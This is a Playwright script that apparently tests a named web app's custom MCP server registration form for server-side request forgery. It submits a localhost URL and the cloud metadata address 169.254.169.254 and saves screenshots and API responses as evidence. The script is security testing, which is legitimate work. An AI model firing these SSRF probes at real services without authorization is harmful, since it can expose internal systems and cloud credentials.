const { chromium } = require('playwright');
const fs = require('fs');
const OUT_DIR = './discovery-evidence/security';
const STATE_DIR = './.state';
if (!fs.existsSync(OUT_DIR)) fs.mkdirSync(OUT_DIR, { recursive: true });

(async () => {
  const browser = await chromium.launch();
  const context = await browser.newContext({ viewport: { width: 1280, height: 900 }, storageState: `${STATE_DIR}/storageState.json` });
  const page = await context.newPage();

  const netLog = [];
  page.on('response', async (res) => {
    if (res.url().includes('/api/') && (res.url().includes('mcp'))) {
      let body = null;
      try { body = await res.text(); } catch (e) {}
      netLog.push({ url: res.url(), status: res.status(), body });
    }
  });

  await page.goto('https://app.medha.pro/custom-mcp', { waitUntil: 'networkidle', timeout: 30000 });
  await page.waitForTimeout(1000);

  // Attempt 1: localhost URL (should be rejected per the UI's own stated policy)
  await page.fill('input[placeholder*="My Notion" i]', 'SSRF Test Localhost');
  await page.fill('input[placeholder*="mcp.example.com" i]', 'https://localhost:8080/sse');
  await page.click('button:has-text("Register server")');
  await page.waitForTimeout(2500);
  await page.screenshot({ path: `${OUT_DIR}/01-localhost-attempt.png`, fullPage: true });
  const text1 = await page.evaluate(() => document.body.innerText);
  fs.writeFileSync(`${OUT_DIR}/01-localhost-attempt.txt`, text1.slice(0, 2000));

  await page.waitForTimeout(500);
  // Attempt 2: private IP (metadata service range, classic SSRF target)
  await page.fill('input[placeholder*="My Notion" i]', 'SSRF Test Metadata').catch(() => {});
  const urlField = await page.$('input[placeholder*="mcp.example.com" i]');
  if (urlField) {
    await urlField.fill('');
    await urlField.fill('http://169.254.169.254/latest/meta-data/');
  }
  await page.click('button:has-text("Register server")');
  await page.waitForTimeout(2500);
  await page.screenshot({ path: `${OUT_DIR}/02-metadata-ip-attempt.png`, fullPage: true });
  const text2 = await page.evaluate(() => document.body.innerText);
  fs.writeFileSync(`${OUT_DIR}/02-metadata-ip-attempt.txt`, text2.slice(0, 2000));

  fs.writeFileSync(`${OUT_DIR}/mcp-ssrf-network.json`, JSON.stringify(netLog, null, 2));
  await browser.close();
})();
